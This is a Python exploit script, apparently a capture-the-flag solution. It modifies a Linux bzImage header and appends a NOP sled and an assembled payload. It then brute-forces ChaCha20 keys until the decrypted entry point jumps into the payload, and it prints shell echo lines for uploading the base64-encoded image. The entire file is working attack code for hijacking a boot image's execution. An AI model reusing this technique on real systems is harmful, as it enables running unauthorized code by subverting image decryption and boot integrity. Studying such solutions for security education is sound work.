import os
from Crypto.Cipher import ChaCha20
import struct
import base64

bzImage=None
with open("../src/bld/fs/boot/bzImage", "rb") as f:
    bzImage=f.read()

default_header_size = (bzImage[0x1f1]+1)<<9
os.system("nasm -f bin exploit.asm -o exploit.bin")

print(default_header_size)

# Place our payload at the end, so it won't get overwritten by the backup image

payload=b"\x90"*(4000)+open("./exploit.bin", "rb").read()

bzImage = bzImage[:0x1f1]+bytes([bzImage[0x1f1]+8])+bzImage[0x1f2:]
bzImage = bzImage[:default_header_size]+payload

with open("./bzImage", "wb") as f:
    f.write(bzImage)

image=base64.b64encode(bzImage)
for x in range(0, len(image), 512):
    print(f"echo -n '{image[x:x+512].decode()}' >> bzImage64")

# Now find a key that decrypts correctly
# Entrypoint is at 0x200 with a jmp instruction
# We need to jump anywhere from 0x4000 to 0x5000
target = b"\xe9\xfd\x3f" # jmp $+0x4000
nonce=b"\x00"*12
key=None
while True:
    key = os.urandom(32)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    out=cipher.encrypt(bzImage[0x200:0x210])
    if(out[0]==target[0]):
        # jmp instruction
        print(out[:3], target)
        target_jmp=struct.unpack("<H", out[1:3])[0]
        if(target_jmp>0x4000 and target_jmp<0x4500):
            print(target_jmp)
            break

with open("./decryptionkey", "wb") as f:
    f.write(key)

